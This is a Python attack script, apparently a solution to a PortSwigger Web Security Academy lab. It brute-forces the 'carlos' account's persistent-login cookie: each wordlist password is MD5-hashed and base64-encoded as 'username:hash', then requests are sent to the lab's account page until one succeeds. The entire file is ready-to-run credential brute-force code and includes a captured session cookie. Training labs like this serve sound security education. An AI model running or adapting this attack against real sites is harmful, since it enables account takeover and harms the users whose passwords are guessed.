import hashlib
import base64
import requests

burp0_url = "https://0ab5002e04c7f16d819a9d2a00f10081.web-security-academy.net:443/my-account?id=carlos"
burp0_cookies = {"stay-logged-in": "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw"}
burp0_headers = {"Sec-Ch-Ua": "\"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Priority": "u=0, i"}

USERNAME = "carlos"

def generate_cookie(password: str):
    global USERNAME

    return base64.b64encode(
        f"{USERNAME}:{hashlib.md5(password.encode()).hexdigest()}".encode()
    ).decode()

def cookie_is_valid(cookie: str):
    cookies = burp0_cookies.copy()
    cookies["stay-logged-in"] = cookie
    r = requests.get(burp0_url, headers=burp0_headers, cookies=cookies, allow_redirects=False)
    return r.status_code == 200

# print(generate_cookie("peter"))
# print(generate_cookie("peter2"))

with open('portswigger-wordlists/passwords', 'r') as file:
    for line in file:
        line = line.strip()

        cookie = generate_cookie(line)

        print(f"Trying: {line} - cookie: {cookie}")

        if cookie_is_valid(cookie):
            print(f"[!] Found password: {line} - cookie: {cookie}")
            exit(0)